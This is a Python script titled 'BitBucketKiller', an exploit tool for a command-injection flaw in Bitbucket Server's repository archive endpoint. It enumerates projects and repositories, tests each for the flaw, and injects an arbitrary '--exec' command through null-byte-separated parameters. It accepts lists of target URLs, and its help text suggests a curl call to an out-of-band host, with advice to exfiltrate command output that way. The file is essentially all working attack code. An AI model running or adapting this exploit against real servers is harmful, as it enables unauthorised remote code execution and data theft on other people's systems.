import requests
import json
from termcolor import colored
import argparse
import os
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import urllib.parse

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

global HTTP_CONFIG
HTTP_CONFIG = None

class EnumBucket:
	def __init__(self, *args):
		self.projects = []
		self.repositorySlugs = {}
		if len(args) == 1:
			self.bucket_url = args[0]

		self.session = requests.Session()
		retry = Retry(connect=3, backoff_factor=0.5)
		adapter = HTTPAdapter(max_retries=retry)
		self.session.mount('http://', adapter)
		self.session.mount('https://', adapter)

		self.session.headers.update({
			"Accept-Language": "en-US;q=0.9,en;q=0.8",
			"Accept-Encoding": "gzip, deflate",
			"Accept": "*/*",
			"Cache-Control": "max-age=0",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36"
		})

		self.session.verify = False
		self.session.allow_redirects = True

		self.session.proxies.update(HTTP_CONFIG)

	def get_projects(self):
		api = "/rest/api/latest/projects/"

		r = self.session.get(f"{self.bucket_url}{api}")
		try:
			r_json = r.json()
		except:
			self.logProc(colored("\t[#] Cannet Get Projects", "blue"))
			return
		
		if r_json["size"] == 0:
			self.logProc(colored("\t[#] No Acessible Projects In Bucket", "blue"))
		else:
			while r_json["isLastPage"] == False:
				values = r_json["values"]
				temp_projects = [value["key"] for value in values]
				self.projects = list(set(self.projects) | set(temp_projects))

				r = self.session.get(f"{self.bucket_url}{api}?start={r_json['nextPageStart']}")
				r_json = r.json()
			values = r_json["values"]
			temp_projects = [value["key"] for value in values]
			self.projects = list(set(self.projects) | set(temp_projects))
		
		# self.logProc(self.projects)

	def get_archieves(self):
		for project in self.projects:
			api = f"/rest/api/latest/projects/{project}/repos/"

			r = self.session.get(f"{self.bucket_url}{api}")
			r_json = r.json()

			project_slugs = []

			if r_json["size"] == 0:
				self.logProc(colored(f"\t[#] No Acessible Slugs In Projects {project}", "blue"))
			else:
				while r_json["isLastPage"] == False:
					values = r_json["values"]
					temp_slugs = [value["slug"] for value in values]
					project_slugs = list(set(project_slugs) | set(temp_slugs))

					r = self.session.get(f"{self.bucket_url}{api}?start={r_json['nextPageStart']}")
					r_json = r.json()
				values = r_json["values"]
				temp_slugs = [value["slug"] for value in values]
				project_slugs = list(set(project_slugs) | set(temp_slugs))

				self.repositorySlugs[project] = project_slugs
		
		# self.logProc(self.repositorySlugs)

	def check_vuln(self, command=None):
		for project in self.repositorySlugs.keys():
			for slug in self.repositorySlugs[project]:
				api = f"/rest/api/latest/projects/{project}/repos/{slug}/archive?format=zip&path=ltidi&prefix=test/%00test"
				
				r = self.session.get(f"{self.bucket_url}{api}")
				r_json = r.json()

				if "An error occurred while executing an external process" in r.text:
					self.logProc(colored("\t[#] Server does not appear to be vulnerable.", "blue"))
				elif "is not a valid ref and may not be archived" in r.text:
					self.logProc(colored(f"\t[!] Server appears to be vulnerable {self.bucket_url}{api}", "red"))
					if command:
						api_vuln = api.split("?")[0]
						self.exploit(command, api_vuln)
				elif "You are not permitted to access this resource" in r.text:
					self.logProc(colored("\t[#] You don't have access to this resource, if this is a private repo, you can provide your session token using --session.", "blue"))
				else:
					self.logProc(colored("\t[+] Unknown response received from server, unable to verify if vulnerable or not.", "yellow"))
					if command:
						api_vuln = api.split("?")[0]
						self.exploit(command, api_vuln)

	def exploit(self, command, api_vuln):
		enc_command = urllib.parse.quote(command)
		api = f"{api_vuln}?format=zip&path=bighax&prefix=test/%00--remote=/%00--exec={enc_command}%00--prefix=/"

		r = self.session.get(f"{self.bucket_url}{api}")
		r_json = r.json()

		if "An error occurred while executing an external process" in r.text:
			self.logProc(colored("[#] Server does not appear to be vulnerable", "blue"))
		elif "com.atlassian.bitbucket.scm.CommandFailedException" in r.text:
			self.logProc(colored(f"[!] The command has been executed, please note that command results are (mostly) blind, it is recommended to enter a command that exfils the response OOB if possible. {self.bucket_url}{api}", "red"))
			self.logProc(colored("[+] Response received from API: {}".format(r.json()["errors"][0]["message"]), "blue"))
		elif "You are not permitted to access this resource" in response.text:
			self.logProc(colored("[#] You don't have access to this resource, if this is a private repo, you can provide your session token using --session.", "blue"))

	def logProc(self, message):
		print(message)


if __name__ == "__main__":
	msg = "BitBucketKiller"
	parser = argparse.ArgumentParser(description=msg)
	parser.add_argument("-bu", "--bucket-url", help = "BitBucket Server Url")
	parser.add_argument("-bul", "--bucket-url-list", help = "Filename of BitBucket Server Urls")
	parser.add_argument("-p", "--proxy", help = "Proxy (ex: 127.0.0.1:8080)")
	parser.add_argument("-c", "--command", help = "curl http://testbitbucket.wtt65xr474lsoekc3c9m2tj8xz3pre.oastify.com/")

	args = parser.parse_args()

	if args.proxy:
		HTTP_CONFIG = {
			"http":f"http://{args.proxy}",
			"https":f"http://{args.proxy}"
		}

	if args.bucket_url:
		print(colored(f"[*] {args.bucket_url}", "green"))
		enum_bucket = EnumBucket(args.bucket_url)
		enum_bucket.get_projects()
		enum_bucket.get_archieves()
		enum_bucket.check_vuln(command=args.command)
	elif args.bucket_url_list:
		try:
			with open(args.bucket_url_list, "r") as f:
				for line in f:
					print(colored(f"[*] {line}", "green"))
					enum_bucket = EnumBucket(line.strip())
					enum_bucket.get_projects()
					enum_bucket.get_archieves()
					enum_bucket.check_vuln(command=args.command)
		except FileNotFoundError:
			print("[!] File Is Not Exist. Please Try Again")
